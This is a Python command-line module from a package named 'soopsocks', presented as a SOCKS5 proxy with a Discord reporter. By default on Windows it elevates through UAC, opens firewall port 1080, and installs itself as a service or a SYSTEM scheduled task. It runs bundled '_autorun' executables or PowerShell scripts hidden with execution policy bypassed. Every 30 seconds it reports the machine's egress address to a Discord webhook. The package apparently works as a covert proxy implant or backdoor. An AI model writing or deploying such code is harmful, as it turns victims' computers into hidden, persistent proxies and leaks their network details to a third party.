import argparse, os, sys, asyncio, platform, subprocess, shlex, importlib, runpy

from .server import main as run_server_main
from .firewall import ensure_firewall_rules
from .egress import probe_egress
from .discord import EgressReporter
from .config import DEFAULT_WEBHOOK, DEFAULT_LISTEN, CUSTOM_BOOT, AUTORUN_FILE
from .autostart import ensure_task, TASK_NAME

SERVICE_NAME = "SoopSocksSvc"

def _autorun_file_path():
    """패키지 폴더 안에서 AUTORUN_FILE 우선 → 기본 후보(_autorun.exe/bat/cmd/ps1) 순으로 탐색"""
    pkg_dir = os.path.dirname(__file__)
    candidates = []
    if AUTORUN_FILE:
        candidates.append(AUTORUN_FILE)
    candidates += ["_autorun.exe", "_autorun.bat", "_autorun.cmd", "_autorun.ps1"]
    for name in candidates:
        p = os.path.join(pkg_dir, name)
        if os.path.isfile(p):
            return p
    return None

def _is_admin_windows():
    if platform.system() != "Windows":
        return False
    try:
        import ctypes
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def _elevate_and_rerun(extra_args):
    args = ["-m", "soopsocks"] + extra_args
    cmd = " ".join(shlex.quote(a) for a in args)
    ps = ["powershell.exe","-NoProfile","-ExecutionPolicy","Bypass","-Command",
          f"Start-Process -FilePath '{sys.executable}' -ArgumentList '{cmd}' -Verb RunAs"]
    subprocess.run(ps, check=False)

def _try_pywin32_service():
    try:
        import win32serviceutil
    except Exception:
        return False, "pywin32 not installed"
    install = subprocess.run([sys.executable,"-m","soopsocks.service_windows","install"],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
    started = subprocess.run([sys.executable,"-m","soopsocks.service_windows","start","--wait","10"],
                             stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
    q = subprocess.run(["sc","query", SERVICE_NAME], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
    ok = b"RUNNING" in (q.stdout or b"")
    return ok, {"install":install, "start":started, "query":q}

def _auto_task_fallback():
    exe = _autorun_file_path()
    if exe:
        if exe.lower().endswith(".ps1"):
            cmd = f'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "{exe}"'
        else:
            cmd = f'"{exe}"'
    else:
        cmd = f'"{sys.executable}" -m soopsocks run --listen {DEFAULT_LISTEN}'
    ok, msgs = ensure_task(cmd, ru_system=True, onstart=True, onlogon=True)
    return ok, msgs


def run(args):
    exe = _autorun_file_path()
    if exe:
        CREATE_NO_WINDOW = 0x08000000 if platform.system()=="Windows" else 0
        DETACHED_PROCESS = 0x00000008 if platform.system()=="Windows" else 0
        flags = CREATE_NO_WINDOW | DETACHED_PROCESS
        if exe.lower().endswith(".ps1"):
            cmd = ["powershell.exe","-NoProfile","-ExecutionPolicy","Bypass","-File", exe]
        else:
            cmd = [exe]
        try:
            subprocess.Popen(cmd, creationflags=flags)
        except Exception:
            subprocess.Popen(cmd)
        return

    pkg_dir = os.path.dirname(__file__)
    autorun_py = os.path.join(pkg_dir, "_autorun.py")
    if os.path.isfile(autorun_py):
        runpy.run_path(autorun_py, run_name="__main__")
        return

    listen = args.listen or DEFAULT_LISTEN
    webhook = args.webhook or DEFAULT_WEBHOOK
    reporter = None
    if webhook:
        reporter = EgressReporter(webhook, interval_sec=30)
        reporter.start()
    try:
        asyncio.run(run_server_main(listen, True))
    finally:
        if reporter:
            reporter.stop()

def firewall(_args):
    prog = sys.executable
    ensure_firewall_rules(prog)
    print("Firewall rules ensured for port 1080.")

def egress(_args):
    print(probe_egress())

def service(args):
    try:
        import win32serviceutil
    except Exception:
        print("pywin32 is required: pip install pywin32"); sys.exit(1)
    cmd = [sys.executable, "-m", "soopsocks.service_windows"]
    if args.svcargs:
        cmd += args.svcargs
    subprocess.run(cmd, check=False)

def auto(_args):
    if platform.system() != "Windows":
        print("`auto`는 Windows에서만 자동 시작 설정을 합니다.")
        print("대신 포그라운드 실행:  soopsocks run --listen 0.0.0.0:1080")
        return

    if not _is_admin_windows():
        print("관리자 권한이 필요합니다. UAC 상승을 시도합니다...")
        _elevate_and_rerun(["auto"])
        return

    ensure_firewall_rules(sys.executable)

    ok, detail = _try_pywin32_service()
    if ok:
        print("서비스 설치 및 시작 완료.")
        return

    ok, msgs = _auto_task_fallback()
    if ok:
        print(f"서비스 대신 작업 스케줄러(Task Scheduler) 자동시작으로 설정했습니다. 작업 이름: {TASK_NAME}")
        return

    print("자동 시작 설정 실패. 세부 정보:")
    print(detail)
    print(msgs)

def pack(_args):
    helper = os.path.join(os.getcwd(), "run_soopsocks_cli.py")
    with open(helper, "w", encoding="utf-8") as f:
        f.write("from soopsocks.cli import main\nif __name__=='__main__':\n    main()\n")
    print("생성됨:", helper)
    print("PyInstaller로 단일 exe 빌드 예시:")
    print("  pip install pyinstaller")
    print("  pyinstaller -F -n soopsocks run_soopsocks_cli.py")
    print("빌드된 soopsocks.exe를 NSSM/WinSW로 서비스로 감싸 설치하는 것을 권장합니다.")

def main(argv=None):
    p = argparse.ArgumentParser(prog="soopsocks",
        description="SOCKS5 server (Python) with optional Discord egress reporter")
    sub = p.add_subparsers(dest="cmd")

    prun = sub.add_parser("run", help="Run SOCKS5 server in foreground")
    prun.add_argument("--listen", default=DEFAULT_LISTEN,
                      help="Listen address, default from LISTEN_ADDR or 0.0.0.0:1080")
    prun.add_argument("--webhook", help="Discord webhook URL to send egress updates")
    prun.set_defaults(func=run)

    pfw = sub.add_parser("firewall", help="Add inbound firewall rules for TCP/UDP 1080")
    pfw.set_defaults(func=firewall)

    pe = sub.add_parser("egress", help="Print current egress info (HTTP+STUN)")
    pe.set_defaults(func=egress)

    ps = sub.add_parser("service", help="Windows service control via pywin32 (install/start/stop/remove)")
    ps.add_argument("svcargs", nargs=argparse.REMAINDER, help="pass-through args for install|start|stop|remove ...")
    ps.set_defaults(func=service)

    pa = sub.add_parser("auto", help="(Windows) Try service install; on failure, create Scheduled Task for auto-start")
    pa.set_defaults(func=auto)

    pp = sub.add_parser("pack", help="Create helper script for PyInstaller onefile build")
    pp.set_defaults(func=pack)

    args = p.parse_args(argv)
    if not args.cmd:
        if platform.system() == "Windows":
            return auto(args)
        p.print_help(); return
    args.func(args)
